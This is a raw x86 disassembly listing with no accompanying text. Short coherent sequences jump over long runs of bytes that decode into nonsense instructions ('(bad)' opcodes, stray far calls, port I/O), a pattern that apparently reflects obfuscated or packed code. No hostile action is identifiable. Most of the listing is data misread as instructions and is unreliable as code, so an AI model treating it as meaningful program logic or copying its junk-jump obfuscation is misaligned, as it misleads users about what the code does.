  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42277c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	cmc    
  40c3d1:	jb     0x40c35c
  40c3d3:	jl     0x40c3e2
  40c3d5:	std    
  40c3d6:	sbb    BYTE PTR [eax],bl
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [esi+0x78],cl
  40c3de:	iret   
  40c3df:	ficomp WORD PTR [edx-0x58]
  40c3e2:	mov    ecx,0xcfd94554
  40c3e7:	cmc    
  40c3e8:	(bad)
  40c3ec:	sbb    ebx,DWORD PTR [ebx-0x10]
  40c3ef:	lods   eax,DWORD PTR ds:[esi]
  40c3f0:	stos   DWORD PTR es:[edi],eax
  40c3f1:	push   ss
  40c3f2:	xchg   ecx,eax
  40c3f3:	fs dec ebp
  40c3f5:	loope  0x40c379
  40c3f7:	sub    eax,0xb40f8fc
  40c3fc:	xor    BYTE PTR [edx+0x681efc1b],cl
  40c402:	cwde   
  40c403:	jae    0x40c479
  40c405:	pop    eax
  40c406:	jecxz  0x40c3c0
  40c408:	les    ebx,FWORD PTR ds:0xb9c569b7
  40c40e:	stc    
  40c40f:	push   eax
  40c410:	test   al,0x84
  40c412:	les    ebp,FWORD PTR [ebp+0x65]
  40c415:	sbb    BYTE PTR [ecx-0x13e192f7],bl
  40c41b:	pop    eax
  40c41c:	pop    esi
  40c41d:	clc    
  40c41e:	jge    0x40c446
  40c420:	push   esi
  40c421:	pop    ecx
  40c422:	mov    cl,0x76
  40c424:	in     eax,dx
  40c425:	(bad)  
  40c426:	cmp    dl,BYTE PTR [eax-0x6e14700a]
  40c42c:	and    DWORD PTR [ebx],0xfffffff4
  40c42f:	inc    esp
  40c430:	sbb    DWORD PTR [eax-0x53984db4],esi
  40c436:	je     0x40c46a
  40c438:	add    bh,BYTE PTR [ecx]
  40c43a:	sub    dh,ah
  40c43c:	inc    edi
  40c43d:	or     BYTE PTR [eax+0x2b],ah
  40c440:	mov    WORD PTR [edx],ds
  40c442:	in     al,dx
  40c443:	inc    ebp
  40c444:	fist   WORD PTR [edx]
  40c446:	fnstcw WORD PTR [ebx+0x2622b393]
  40c44c:	pop    edx
  40c44d:	imul   ebp,DWORD PTR [ecx-0x52],0xffffffab
  40c451:	pop    esi
  40c452:	add    eax,edx
  40c454:	mov    eax,eax
  40c456:	or     ch,BYTE PTR [edx]
  40c458:	jmp    0xbb8d57c9
  40c45d:	je     0x40c4a8
  40c45f:	sbb    bh,BYTE PTR [ecx-0x64b1fa3d]
  40c465:	adc    BYTE PTR [ebx+eiz*2+0x49e3e882],0x21
  40c46d:	fmul   QWORD PTR [esi+0x7e538ec4]
  40c473:	inc    ebp
  40c474:	cld    
  40c475:	push   edi
  40c476:	stos   DWORD PTR es:[edi],eax
  40c477:	leavew 
  40c479:	push   esi
  40c47a:	mov    ebp,0x307c385d
  40c47f:	adc    ah,BYTE PTR [ebp-0x79cbe200]
  40c485:	int3   
  40c486:	add    BYTE PTR [eax],ah
  40c488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c489:	mov    esp,DWORD PTR [esi+0x69]
  40c48c:	ror    ch,1
  40c48e:	xchg   esi,eax
  40c48f:	mov    ah,0xfd
  40c491:	loope  0x40c422
  40c493:	sub    ebp,DWORD PTR [esi+edi*8-0x85cc90e]
  40c49a:	lods   al,BYTE PTR ss:[esi]
  40c49c:	in     al,dx
  40c49d:	push   ecx
  40c49e:	jp     0x40c452
  40c4a0:	pop    ds
  40c4a1:	into   
  40c4a2:	cwde   
  40c4a3:	pop    ds
  40c4a4:	push   es
  40c4a5:	cld    
  40c4a6:	mov    ebx,DWORD PTR [ecx]
  40c4a8:	dec    esp
  40c4a9:	mov    esi,0x69a3184c
  40c4ae:	fs ret 
  40c4b0:	in     eax,0xa3
  40c4b2:	(bad)  
  40c4b3:	aad    0x7f
  40c4b5:	mov    ds:0xb303691d,al
  40c4ba:	add    BYTE PTR [eax-0x5c],0x38
  40c4be:	scas   al,BYTE PTR es:[edi]
  40c4bf:	jmp    0x40c4d5
  40c4c1:	lock mov eax,0xfa6c84ae
  40c4c7:	and    al,0x97
  40c4c9:	xor    cl,bh
  40c4cb:	rcr    BYTE PTR [ebx-0x46],1
  40c4ce:	les    ebp,FWORD PTR [ebx-0x6b879cc6]
  40c4d4:	xchg   esp,eax
  40c4d5:	jecxz  0x40c511
  40c4d7:	or     al,ch
  40c4d9:	sar    BYTE PTR [ebp+0x2e],0x3d
  40c4dd:	jae    0x40c527
  40c4df:	fiadd  DWORD PTR [ebx-0xb]
  40c4e2:	jne    0x40c464
  40c4e4:	adc    BYTE PTR [edi+0x12543ba4],0xfa
  40c4eb:	mov    ah,ch
  40c4ed:	arpl   WORD PTR [ebx+0x5862f084],ax
  40c4f3:	add    al,0xba
  40c4f5:	ja     0x40c555
  40c4f7:	aam    0x4f
  40c4f9:	aas    
  40c4fa:	jmp    0x40c531
  40c4fc:	push   ecx
  40c4fd:	jmp    0x40c558
  40c4ff:	dec    ebp
  40c500:	push   cs
  40c501:	inc    esp
  40c502:	mov    al,gs:0xcc07473e
  40c508:	sbb    DWORD PTR [edi],edx
  40c50a:	mov    bx,0x87ed
  40c50e:	add    edi,DWORD PTR [ebx+ebx*1]
  40c511:	jae    0x40c4a2
  40c513:	icebp  
  40c514:	sub    eax,0x5fa5f0b3
  40c519:	test   BYTE PTR [ebp+0x4f0788f],dh
  40c51f:	mov    esp,edi
  40c521:	xchg   esp,eax
  40c522:	adc    bh,BYTE PTR [esi+0x28af5f6a]
  40c528:	pusha  
  40c529:	in     al,dx
  40c52a:	sbb    BYTE PTR [edi-0x364a8c3a],bh
  40c530:	or     edx,edi
  40c532:	imul   ecx,esp,0xcb950c31
  40c538:	or     ah,BYTE PTR [ebx-0x5de50b41]
  40c53e:	int3   
  40c53f:	loopne 0x40c545
  40c541:	mov    ebp,0xb597b621
  40c546:	jmp    0xbc13:0x30642b5c
  40c54d:	repz (bad) 
  40c54f:	fs daa 
  40c551:	mov    al,ds:0xa226b5b2
  40c556:	push   ecx
  40c557:	jl     0x40c53d
  40c559:	mov    DWORD PTR [esi-0x79224980],edi
  40c55f:	sub    al,0x5d
  40c561:	jg     0x40c541
  40c563:	fld    TBYTE PTR [edx+0x51]
  40c566:	popf   
  40c567:	ret    0x89c6
  40c56a:	or     ebx,DWORD PTR [edi-0x795ae18]
  40c570:	aad    0x54
  40c572:	or     eax,0x174de043
  40c577:	adc    ebx,DWORD PTR [edx]
  40c579:	mov    WORD PTR [edi+0x4c],fs
  40c57c:	out    0x1b,al
  40c57e:	call   0xcf0:0x83eb99d4
  40c585:	pop    esi
  40c586:	stos   DWORD PTR es:[edi],eax
  40c587:	sub    BYTE PTR [ebx-0x2358f5cc],bh
  40c58d:	mov    ebp,0x52bfde81
  40c592:	scas   eax,DWORD PTR es:[edi]
  40c593:	je     0x40c5c1
  40c595:	xchg   DWORD PTR [edi-0x5c],esi
  40c598:	xchg   ecx,eax
  40c599:	xchg   DWORD PTR [edi+edi*1+0x23ec6fe6],ebp
  40c5a0:	add    cl,BYTE PTR [edi-0x7e]
  40c5a3:	pop    ebx
  40c5a4:	stos   BYTE PTR es:[edi],al
  40c5a5:	iret   
  40c5a6:	push   esp
  40c5a7:	inc    eax
  40c5a8:	adc    DWORD PTR [edx],esi
  40c5aa:	jae    0x40c617
  40c5ac:	add    al,0x18
  40c5ae:	retf   0x2056
  40c5b1:	add    ah,BYTE PTR [edx-0x66]
  40c5b4:	push   edi
  40c5b5:	iret   
  40c5b6:	dec    esi
  40c5b7:	pop    edi
  40c5b8:	sar    DWORD PTR ds:0xfda07605,1
  40c5be:	dec    esp
  40c5bf:	pop    es
  40c5c0:	mov    dl,0xf6
  40c5c2:	int    0x78
  40c5c4:	adc    ebp,DWORD PTR [edi]
  40c5c6:	and    al,0x92
  40c5c8:	pop    ebp
  40c5c9:	and    al,0xd6
  40c5cb:	xchg   ecx,eax
  40c5cc:	out    0x35,al
  40c5ce:	test   BYTE PTR ds:0x33696535,0xb0
  40c5d5:	stos   DWORD PTR es:[edi],eax
  40c5d6:	and    ebx,DWORD PTR [esi+0xa158de0]
  40c5dc:	dec    esp
  40c5dd:	fist   DWORD PTR [ecx-0x7f3740d3]
  40c5e3:	and    eax,0x7dd7e7e3
  40c5e8:	jle    0x40c603
  40c5ea:	std    
  40c5eb:	jmp    0x40c5be
  40c5ed:	xchg   esp,eax
  40c5ee:	add    edi,0xffffffe1
  40c5f1:	or     BYTE PTR [edx],0xc8
  40c5f4:	push   cs
  40c5f5:	(bad)  [ecx]
  40c5f7:	ins    DWORD PTR es:[edi],dx
  40c5f8:	(bad)  
  40c5f9:	idiv   DWORD PTR [eax+0x52]
  40c5fc:	cmc    
  40c5fd:	mov    bh,0xd2
  40c5ff:	imul   edx,DWORD PTR [esi+0x76],0x9cbef7c3
  40c606:	add    al,0xe6
  40c608:	sbb    DWORD PTR [ebp-0x78],ebp
  40c60b:	xchg   ecx,eax
  40c60c:	adc    DWORD PTR [ebx-0x386f1ab],ecx
  40c612:	fwait
  40c613:	mov    esi,0xa4f1465
  40c618:	or     bl,BYTE PTR [eax]
  40c61a:	out    0x9f,al
  40c61c:	cmp    cl,BYTE PTR [ecx]
  40c61e:	mov    bl,0x54
  40c620:	jg     0x40c607
  40c622:	and    cl,BYTE PTR [eax+0x4b315338]
  40c628:	xchg   esi,eax
  40c629:	fistp  WORD PTR [esi+0x412444fc]
  40c62f:	mov    eax,0xa2fa634f
  40c634:	call   0xba10:0xf820d3d5
  40c63b:	push   edi
  40c63c:	pop    edx
  40c63d:	repnz int 0x23
  40c640:	xor    edi,ebp
  40c642:	jne    0x40c6ab
  40c644:	les    ebx,FWORD PTR [ebp+0x39cb4a35]
  40c64a:	jae    0x40c68a
  40c64c:	es ins BYTE PTR es:[edi],dx
  40c64e:	(bad)  
  40c64f:	fisub  WORD PTR [ebx-0x6e5f6b00]
  40c655:	push   ebp
  40c656:	xchg   ebx,eax
  40c657:	mov    dh,0x98
  40c659:	push   ecx
  40c65a:	retf   
  40c65b:	pop    eax
  40c65c:	inc    edi
  40c65d:	inc    esi
  40c65e:	sbb    eax,0xc2b1d2c5
  40c663:	icebp  
  40c664:	sbb    dl,ch
  40c666:	js     0x40c6df
  40c668:	dec    esi
  40c669:	retf   0x23a0
  40c66c:	sub    ebp,ecx
  40c66e:	mov    dh,dl
  40c670:	int    0x9b
  40c672:	sub    eax,0x2ae786c
  40c677:	repz adc dl,BYTE PTR [eax+ecx*1-0x761d0056]
  40c67f:	fs push ss
  40c681:	adc    al,0x5a
  40c683:	mov    bh,0xfb
  40c685:	imul   edi,eax,0xfdd93fac
  40c68b:	fcomip st,st(0)
  40c68d:	mov    es,WORD PTR [ebx-0x65078924]
  40c693:	xor    BYTE PTR es:[edi+esi*1],0x8f
  40c698:	scas   eax,DWORD PTR es:[edi]
  40c699:	aaa    
  40c69a:	sbb    DWORD PTR [eax+0x32],esi
  40c69d:	sbb    DWORD PTR ds:0xc9ae7e9b,ebp
  40c6a3:	aam    0x8f
  40c6a5:	or     bh,al
  40c6a7:	add    al,0x11
  40c6a9:	in     al,0xfd
  40c6ab:	ret    
  40c6ac:	dec    edx
  40c6ad:	pop    ds
  40c6ae:	imul   edi,DWORD PTR [edx-0xa3dd03c],0xd01bc289
  40c6b8:	xchg   edi,eax
  40c6b9:	add    esp,DWORD PTR [ebp+0x3badb000]
  40c6bf:	out    0xa6,eax
  40c6c1:	(bad)  
  40c6c2:	cmp    eax,0x64accd02
  40c6c7:	jp     0x40c715
  40c6c9:	jmp    0x12f182d5
  40c6ce:	pusha  
  40c6cf:	lods   eax,DWORD PTR ds:[esi]
  40c6d0:	mov    ds:0x1bbdf41f,eax
  40c6d5:	leave  
  40c6d6:	shl    BYTE PTR [edi-0x4c5c474b],cl
  40c6dc:	inc    esi
  40c6de:	mov    bl,BYTE PTR [edx-0x7d]
  40c6e1:	outs   dx,BYTE PTR ds:[esi]
  40c6e2:	stos   BYTE PTR es:[edi],al
  40c6e3:	in     eax,dx
  40c6e4:	je     0x40c6dd
  40c6e6:	outs   dx,DWORD PTR ds:[esi]
  40c6e7:	clc    
  40c6e8:	add    edx,ebx
  40c6ea:	lea    edx,[edi+0xf]
  40c6ed:	xchg   edx,eax
  40c6ee:	test   al,0xb1
  40c6f0:	scas   al,BYTE PTR es:[edi]
  40c6f1:	cli    
  40c6f2:	jae    0x40c705
  40c6f4:	outs   dx,BYTE PTR ds:[esi]
  40c6f5:	mov    ebx,0xcdfba527
  40c6fa:	gs adc al,0x16
  40c6fd:	jo     0x40c6a5
  40c6ff:	push   ecx
  40c700:	add    eax,0xef094f34
  40c705:	pop    ebx
  40c706:	ins    DWORD PTR es:[edi],dx
  40c707:	pop    eax
  40c708:	shl    BYTE PTR [ecx+esi*8-0x79156062],1
  40c70f:	inc    eax
  40c710:	clc    
  40c711:	int    0x14
  40c713:	or     BYTE PTR [edi-0x68aa0045],al
  40c719:	retf   0x3df2
  40c71c:	inc    ebx
  40c71d:	fs and eax,0x50d15037
  40c723:	adc    edi,DWORD PTR [esi]
  40c725:	push   esi
  40c726:	sub    bl,BYTE PTR [ebx+0x60]
  40c729:	in     al,dx
  40c72a:	xor    ecx,eax
  40c72c:	adc    eax,0xc05b706c
  40c731:	or     bh,BYTE PTR [edx]
  40c733:	xor    cl,ch
  40c735:	out    0xbb,al
  40c737:	push   0x76
  40c739:	lahf   
  40c73a:	xor    BYTE PTR [edx+0x30],dl
  40c73d:	out    0x2d,eax
  40c73f:	ja     0x40c6c1
  40c741:	popf   
  40c742:	mov    al,ds:0x90b4e210
  40c747:	retf   0xd56
  40c74a:	out    0xf9,eax
  40c74c:	mov    ebp,0x835a79af
  40c751:	fs dec esp
  40c753:	cld    
  40c754:	mov    eax,0x424b0ab3
  40c759:	out    0xcb,al
  40c75b:	xor    BYTE PTR [edi+0x37e9dc6c],bl
  40c761:	shr    BYTE PTR [ebp+0x76],cl
  40c764:	xchg   ebx,eax
  40c765:	shl    DWORD PTR [eax+ecx*1-0x67262108],0x88
  40c76d:	inc    edx
  40c76e:	call   0x80b32673
  40c773:	cmc    
  40c774:	lds    eax,FWORD PTR [edi]
  40c776:	mov    ch,0xd5
  40c778:	in     al,dx
  40c779:	mov    edi,0xc3eda4b3
  40c77e:	inc    ecx
  40c77f:	push   ebp
  40c780:	sub    DWORD PTR [edi],edi
  40c782:	mov    bl,0x13
  40c784:	imul   esi,DWORD PTR [esi-0x62dffaa7],0xb282b564
  40c78e:	inc    edx
  40c78f:	add    esi,esi
  40c791:	sub    dl,BYTE PTR [esi+0x21]
  40c794:	pop    eax
  40c795:	int3   
  40c796:	outs   dx,DWORD PTR ds:[esi]
  40c797:	sbb    DWORD PTR [edx],ebp
  40c799:	lock in al,0x6b
  40c79c:	bound  ebp,QWORD PTR [edx-0x5b384fe9]
  40c7a2:	shufps xmm7,xmm0,0xeb
  40c7a6:	(bad)  
  40c7a7:	scas   eax,DWORD PTR es:[edi]
  40c7a8:	fstp   DWORD PTR [eax]
  40c7aa:	popf   
  40c7ab:	aaa    
  40c7ac:	popa   
  40c7ad:	sbb    DWORD PTR [edi-0x72],0xffffffb5
  40c7b1:	inc    edi
  40c7b2:	push   ebx
  40c7b3:	adc    DWORD PTR [esi],edx
  40c7b5:	xor    al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi-0x28567c90]
  40c7fd:	mov    esp,0x1818f563
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [ecx],bl
  40c807:	sbb    edx,DWORD PTR ds:0xc1faa8e1
  40c80d:	(bad)  
  40c80e:	jge    0x40c7d7
  40c810:	or     edi,DWORD PTR [edi+eiz*8-0x66991d93]
  40c817:	lods   al,BYTE PTR ds:[esi]
  40c818:	pop    ss
  40c819:	lahf   
  40c81a:	inc    esi
  40c81b:	enter  0xbd48,0xdf
  40c81f:	mov    ds:0x5db22761,eax
  40c824:	test   BYTE PTR [edi],bh
  40c826:	loop   0x40c80a
  40c828:	push   edi
  40c829:	mov    dl,0x21
  40c82b:	out    0x5f,eax
  40c82d:	or     BYTE PTR [edx+ecx*1-0x21],al
  40c831:	mov    dh,0x84
  40c833:	dec    esp
  40c834:	mov    esi,0xf0a3684e
  40c839:	adc    eax,0xf01cc512
  40c83e:	add    ecx,DWORD PTR [eax-0x2a]
  40c841:	sbb    BYTE PTR [ebx-0x660c24cc],bl
  40c847:	push   eax
  40c848:	rol    BYTE PTR [eax+0x212a2e0c],1
  40c84e:	outs   dx,DWORD PTR ds:[esi]
  40c84f:	xor    DWORD PTR [eax+0x12],ecx
  40c852:	or     BYTE PTR [ebx],cl
  40c854:	push   edi
  40c855:	jmp    0xd386c754
  40c85a:	lahf   
  40c85b:	jl     0x40c855
  40c85d:	xchg   edx,eax
  40c85e:	std    
  40c85f:	sbb    esi,DWORD PTR [ecx+ebx*1]
  40c862:	mov    al,0x8a
  40c864:	inc    esi
  40c865:	out    0x4f,eax
  40c867:	sbb    BYTE PTR [ebx-0x8],dl
  40c86a:	push   eax
  40c86b:	push   esi
  40c86c:	int3   
  40c86d:	data16 lods al,BYTE PTR ds:[esi]
  40c86f:	add    DWORD PTR [edi+0xb],ecx
  40c872:	fisub  DWORD PTR [ebp-0x775937d0]
  40c878:	pop    eax
  40c879:	in     al,0x1f
  40c87b:	add    eax,0xac4cfad3
  40c880:	adc    al,0x6b
  40c882:	push   ebx
  40c883:	sbb    bl,0x84
  40c886:	xor    edx,DWORD PTR [ecx+0x4e]
  40c889:	ja     0x40c866
  40c88b:	mov    eax,0xfc7e9bb0
  40c890:	pop    ecx
  40c891:	sti    
  40c892:	and    edi,DWORD PTR [ebp-0x46d9972c]
  40c898:	xor    eax,0x1d9e1aec
  40c89d:	cmp    DWORD PTR cs:[eax+edi*4-0x31],eax
  40c8a2:	popf   
  40c8a3:	mov    DWORD PTR [esi+0x73915a26],ebp
  40c8a9:	in     eax,0xd1
  40c8ab:	sub    DWORD PTR [esi+0x1c],edi
  40c8ae:	bswap  esi
  40c8b0:	add    BYTE PTR [ecx+ecx*8+0x33657dfa],ch
  40c8b7:	ret    0xb0fb
  40c8ba:	je     0x40c937
  40c8bc:	adc    edi,DWORD PTR [ebx-0x22463e2b]
  40c8c2:	shl    BYTE PTR [eax-0x22ab097b],cl
  40c8c8:	push   es
  40c8c9:	aad    0x4a
  40c8cb:	daa    
  40c8cc:	add    bl,BYTE PTR [ecx-0x28efbea0]
  40c8d2:	enter  0xcd06,0x97
  40c8d6:	lds    ecx,FWORD PTR [ecx+0x42213866]
  40c8dc:	cmp    eax,0x68614472
  40c8e1:	xchg   ebx,eax
  40c8e2:	cdq    
  40c8e3:	or     DWORD PTR [ecx+0x3],esp
  40c8e6:	sub    BYTE PTR [edx],bl
  40c8e8:	xchg   edx,eax
  40c8e9:	fstp   DWORD PTR [edx-0x2d1c0568]
  40c8ef:	repnz mov esi,0x3778624b
  40c8f5:	loope  0x40c966
  40c8f7:	xchg   esp,eax
  40c8f8:	add    DWORD PTR [esi+ebx*4+0x3a98bd3a],ecx
  40c8ff:	cmp    al,ah
  40c901:	or     dh,BYTE PTR [eax+0x57d3f59]
  40c907:	mov    edi,0x3d3fa755
  40c90c:	or     eax,0x9f66f503
  40c911:	mov    al,ds:0x4def30a
  40c916:	test   al,0x5
  40c918:	repnz adc DWORD PTR [edx-0x49],0x11
  40c91d:	mov    ebx,0xa6a7ad5c
  40c922:	ror    DWORD PTR [edx+0x3a],cl
  40c925:	lahf   
  40c926:	rep outs dx,BYTE PTR ds:[esi]
  40c928:	push   eax
  40c929:	inc    ebx
  40c92a:	pop    edi
  40c92b:	nop
  40c92c:	daa    
  40c92d:	pop    ebp
  40c92e:	mov    bh,0xb4
  40c930:	xlat   BYTE PTR ds:[ebx]
  40c931:	adc    DWORD PTR [esi],ecx
  40c933:	nop
  40c934:	enter  0x7d3e,0x8f
  40c938:	add    BYTE PTR [eax],al
  40c93a:	jg     0x40c8d9
  40c93c:	arpl   WORD PTR [eax+0x7c],bp
  40c93f:	mov    ebx,es
  40c941:	dec    ebp
  40c942:	cmp    BYTE PTR ds:0x6a3b05f6,al
  40c948:	pop    esp
  40c949:	cmc    
  40c94a:	(bad)  
  40c94c:	js     0x40c928
  40c94e:	fmul   st(3),st
  40c950:	test   BYTE PTR [bx+si],0xdd
  40c954:	sbb    ebp,0xffffffc8
  40c957:	xchg   ebp,eax
  40c958:	retf   0xa275
  40c95b:	cs pushf 
  40c95d:	jne    0x40c984
  40c95f:	xchg   edx,eax
  40c960:	xchg   edx,eax
  40c961:	popf   
  40c962:	in     al,0xb6
  40c964:	arpl   WORD PTR [edi+0x52],ax
  40c967:	or     al,bh
  40c969:	dec    ecx
  40c96a:	popa   
  40c96b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c96c:	popa   
  40c96d:	push   edx
  40c96e:	jns    0x40c9d1
  40c970:	pop    esi
  40c971:	sub    eax,0x42075b6a
  40c976:	jnp    0x40c9e2
  40c978:	push   edx
  40c979:	mov    edi,ebx
  40c97b:	aam    0xc5
  40c97d:	clc    
  40c97e:	xor    BYTE PTR [eax-0x2a],ch
  40c981:	fld    TBYTE PTR [edx+0x8]
  40c984:	or     eax,0xe4be1ca3
  40c989:	aaa    
  40c98a:	cmc    
  40c98b:	out    dx,eax
  40c98c:	neg    esi
  40c98e:	shl    BYTE PTR [ebp+eax*4+0x78],1
  40c992:	sar    BYTE PTR [eax-0x7],1
  40c995:	push   edi
  40c996:	bound  ebx,QWORD PTR [edx]
  40c998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c999:	inc    ebx
  40c99a:	icebp  
  40c99b:	push   edx
  40c99c:	cli    
  40c99d:	aaa    
  40c99e:	(bad)  
  40c99f:	mov    ebx,0x5139859b
  40c9a4:	fcom   DWORD PTR [ebp+0xb]
  40c9a7:	mov    ds,WORD PTR [edx+eiz*8]
  40c9aa:	pop    ebx
  40c9ab:	push   ds
  40c9ac:	in     eax,dx
  40c9ad:	aam    0x6
  40c9af:	ror    ebp,1
  40c9b1:	addr16 loopne 0x40c9fe
  40c9b4:	aad    0x9d
  40c9b6:	fisttp WORD PTR [ecx-0x4e]
  40c9b9:	jno    0x40ca2d
  40c9bb:	pop    edi
  40c9bc:	(bad)  
  40c9bd:	retf   0x35a
  40c9c0:	cmp    DWORD PTR [ebp-0x15],esp
  40c9c3:	jne    0x40c94e
  40c9c5:	sbb    BYTE PTR ds:0xdfe00307,bl
  40c9cb:	inc    esi
  40c9cc:	call   0xacfb0f68
  40c9d1:	arpl   WORD PTR [eax+ebp*4-0x12],sp
  40c9d5:	cdq    
  40c9d6:	xchg   esp,eax
  40c9d7:	jg     0x40c9a3
  40c9d9:	push   ecx
  40c9da:	add    al,0x42
  40c9dc:	(bad)  
  40c9dd:	fcom   QWORD PTR [edi]
  40c9df:	loop   0x40c978
  40c9e1:	and    ch,BYTE PTR [esi+0x2d]
  40c9e4:	outs   dx,DWORD PTR ds:[esi]
  40c9e5:	pop    ebx
  40c9e6:	xor    eax,0x2a97fd02
  40c9eb:	adc    al,al
  40c9ed:	leave  
  40c9ee:	popa   
  40c9ef:	pusha  
  40c9f0:	shl    BYTE PTR [edx],1
  40c9f2:	aam    0x89
  40c9f4:	enter  0x41d7,0x1d
  40c9f8:	in     eax,dx
  40c9f9:	inc    ebp
  40c9fa:	mov    ebx,DWORD PTR [ebx+0x32]
  40c9fd:	in     eax,0x7b
  40c9ff:	and    BYTE PTR [esi],dh
  40ca01:	sbb    DWORD PTR [edx-0x6c325037],esi
  40ca07:	add    eax,0xea6dfac4
  40ca0c:	inc    esp
  40ca0d:	repnz and al,0xd0
  40ca10:	inc    edx
  40ca11:	shl    DWORD PTR [edi+0x6041aad1],1
  40ca17:	mov    DWORD PTR ds:0xbd5752c0,eax
  40ca1d:	inc    eax
  40ca1e:	sbb    dl,BYTE PTR [edi]
  40ca20:	ds push cs
  40ca22:	sbb    al,BYTE PTR [esi-0x755d1ac1]
  40ca28:	sahf   
  40ca29:	adc    eax,0x656d9386
  40ca2e:	adc    BYTE PTR [edi+0x79568319],ah
  40ca34:	sub    al,0x38
  40ca36:	dec    esp
  40ca37:	pusha  
  40ca38:	add    DWORD PTR [edx],edi
  40ca3a:	mov    ebp,0x3a248cbd
  40ca3f:	jae    0x40ca9a
  40ca41:	sub    bl,BYTE PTR fs:[esi+0x7a77fb69]
  40ca48:	inc    esp
  40ca49:	jmp    0xa0491a91
  40ca4e:	mov    ecx,0xff106aff
  40ca53:	pop    ebx
  40ca54:	mov    ds:0x585da590,al
  40ca59:	test   al,0x6a
  40ca5b:	xchg   DWORD PTR [esp+eiz*2],esi
  40ca5e:	int3   
  40ca5f:	dec    esi
  40ca60:	jmp    0x40ca00
  40ca62:	pop    ebx
  40ca63:	mov    cl,bl
  40ca65:	cmp    dh,BYTE PTR [ecx-0x20]
  40ca68:	jbe    0x40c9f0
  40ca6a:	rol    DWORD PTR [ebp-0x43],1
  40ca6d:	add    al,0x75
  40ca6f:	rol    BYTE PTR [ebp-0x3c],cl
  40ca72:	and    al,0x46
  40ca74:	bound  esi,QWORD PTR [eax+0x13]
  40ca77:	hlt    
  40ca78:	push   ebp
  40ca79:	fldenv [ecx+0x19]
  40ca7c:	cmp    al,0x1a
  40ca7e:	sahf   
  40ca7f:	or     ah,BYTE PTR [edx-0x726cd186]
  40ca85:	push   cs
  40ca86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca87:	test   eax,0x933f90fe
  40ca8c:	outs   dx,DWORD PTR ds:[esi]
  40ca8d:	mov    ah,0x2b
  40ca8f:	jno    0x40ca63
  40ca91:	fwait
  40ca92:	add    BYTE PTR [ebp+ebp*2-0x6a],cl
  40ca96:	push   edi
  40ca97:	daa    
  40ca98:	inc    edi
  40ca99:	cmp    al,0xa2
  40ca9b:	push   es
  40ca9c:	sbb    BYTE PTR [edx],dh
  40ca9e:	dec    eax
  40ca9f:	xchg   esi,eax
  40caa0:	(bad)  
  40caa1:	sbb    DWORD PTR [edx-0x7],ebp
  40caa4:	sbb    BYTE PTR [eax-0x27ada8b6],dl
  40caaa:	ins    DWORD PTR es:[edi],dx
  40caab:	adc    DWORD PTR [ebx+ecx*4-0x79],ebx
  40caaf:	mov    edi,0x8c0d7f37
  40cab4:	dec    edi
  40cab5:	stos   DWORD PTR es:[edi],eax
  40cab6:	dec    ecx
  40cab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab8:	mov    cl,BYTE PTR [eax+0x18ab2b1b]
  40cabe:	jp     0x40ca63
  40cac0:	add    al,0xb3
  40cac2:	adc    ebp,DWORD PTR gs:[ebx-0x123eb612]
  40cac9:	(bad)  
  40caca:	xchg   ebx,eax
  40cacb:	push   ss
  40cacc:	sbb    dl,dh
  40cace:	int3   
  40cacf:	push   es
  40cad0:	mov    DWORD PTR [eax],0x31a3550c
  40cad6:	ret    
  40cad7:	retf   
  40cad8:	inc    eax
  40cad9:	gs stos DWORD PTR es:[edi],eax
  40cadb:	pop    ebx
  40cadc:	jb     0x40cb52
  40cade:	dec    ecx
  40cadf:	mov    WORD PTR [edx],?
  40cae1:	scas   al,BYTE PTR es:[edi]
  40cae2:	cli    
  40cae3:	in     eax,0xf4
  40cae5:	push   0x42e99542
  40caea:	out    0x7f,al
  40caec:	xchg   BYTE PTR [edi-0x79],ah
  40caef:	jmp    0x40cb3f
  40caf1:	imul   di,ax,0xe990
  40caf6:	sbb    ebx,ebp
  40caf8:	cdq    
  40caf9:	int3   
  40cafa:	sub    al,0xdd
  40cafc:	ret    0xdb61
  40caff:	aam    0x49
  40cb01:	cmc    
  40cb02:	mov    al,ds:0x80b5322f
  40cb07:	dec    ebx
  40cb08:	imul   ebp,edi,0xa07f978a
  40cb0e:	mov    cl,0x63
  40cb10:	daa    
  40cb11:	adc    eax,0xffffffe9
  40cb14:	jmp    0x40cb6c
  40cb16:	push   edx
  40cb17:	outs   dx,DWORD PTR ds:[esi]
  40cb18:	pop    ecx
